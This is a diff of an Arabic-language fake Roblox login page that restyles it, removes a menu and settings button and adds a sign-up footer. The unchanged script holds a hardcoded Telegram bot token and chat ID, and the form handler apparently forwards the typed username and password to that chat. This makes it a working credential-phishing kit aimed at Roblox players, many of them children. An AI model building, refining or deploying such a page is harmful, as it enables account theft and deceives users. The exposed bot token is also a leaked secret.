@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - صفحة تسجيل الدخول</title>
+    <title>تسجيل الدخول إلى Roblox</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #171717; /* Dark background similar to Roblox */
-            color: white; /* White text for contrast */
+            font-family: 'Arial', sans-serif;
+            background-color: #2b2d42; /* Dark background */
+            color: #ffffff; /* White text */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,16 +16,16 @@
             margin: 0;
         }
         .login-container {
-            background-color: #2b2b2b; /* Dark gray for container */
+            background-color: #3f3f3f; /* Dark gray for container */
             padding: 40px;
-            border-radius: 10px;
+            border-radius: 12px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
             text-align: center;
-            width: 350px; /* Fixed width for consistency */
+            width: 400px; /* Fixed width for consistency */
         }
         h1 {
             margin-bottom: 20px;
-            font-size: 28px;
+            font-size: 32px;
             color: #ffcc00; /* Roblox yellow */
         }
         input {
@@ -33,10 +33,10 @@
             width: calc(100% - 20px); /* Adjusted for padding */
             padding: 10px;
             margin: 10px 0;
-            border: none;
-            border-radius: 5px;
+            border: 1px solid #444; /* Dark border */
+            border-radius: 6px;
             font-size: 16px;
-            background-color: #444; /* Dark input fields */
+            background-color: #555; /* Dark input fields */
             color: white; /* White text for inputs */
         }
         button {
@@ -44,7 +44,7 @@
             color: black; /* Black text for button */
             padding: 10px;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
             cursor: pointer;
             font-size: 16px;
             transition: background-color 0.3s ease;
@@ -58,79 +58,31 @@
             margin-top: 15px;
             color: #ffcc00; /* Yellow for messages */
         }
-        /* Menu styles */
-        .menu {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            cursor: pointer;
-            font-size: 24px;
-            color: #ffcc00; /* Yellow for menu */
-        }
-        .dropdown {
-            display: none;
-            position: absolute;
-            right: 10px;
-            top: 40px;
-            background-color: #2b2b2b; /* Match container */
-            border: 1px solid #444;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            z-index: 1;
-        }
-        .dropdown a {
-            display: block;
-            padding: 10px;
-            color: #ffcc00; /* Yellow for dropdown items */
-            text-decoration: none;
-        }
-        .dropdown a:hover {
-            background-color: #444; /* Darker background on hover */
-        }
-        /* Settings button */
-        .settings-button {
-            background-color: #444;
-            color: #ffcc00; /* Yellow text */
-            margin-top: 15px;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%; /* Full width button */
-        }
-        .settings-button:hover {
-            background-color: #555; /* Slightly lighter gray on hover */
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ccc; /* Light gray for footer text */
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="menu" id="menu">•••</div>
-        <div class="dropdown" id="dropdown">
-            <a href="#" id="feature1">ميزة 1</a>
-            <a href="#" id="feature2">ميزة 2</a>
-            <a href="#" id="feature3">ميزة 3</a>
-        </div>
         <h1>تسجيل الدخول إلى Roblox</h1>
         <form id="loginForm">
             <input type="text" id="username" placeholder="اسم المستخدم" required>
             <input type="password" id="password" placeholder="كلمة المرور" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
-        <button class="settings-button" id="settingsButton">الإعدادات</button>
         <p id="result"></p>
+        <div class="footer">
+            <p>لا تملك حساب؟ <a href="#" style="color: #ffcc00;">إنشاء حساب</a></p>
+        </div>
     </div>
 
     <script>
         // Replace these with your actual Telegram Bot Token and Chat ID
         const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
         const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك
-
-        // Toggle dropdown menu visibility
-        document.getElementById('menu').addEventListener('click', function() {
-            const dropdown = document.getElementById('dropdown');
-            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
-        });
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -166,20 +118,6 @@
                 console.error('Error:', error);
                 result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
             });
-        });
-
-        // Handle settings button click (Example functionality)
-        document.getElementById('settingsButton').addEventListener('click', function() {
-            alert('إعدادات الحساب');
-            // You can add more settings functionality here
-        });
-
-        // Close dropdown when clicking outside
-        window.addEventListener('click', function(event) {
-            const dropdown = document.getElementById('dropdown');
-            if (!event.target.matches('.menu')) {
-                dropdown.style.display = 'none';
-            }
         });
     </script>
 </body>
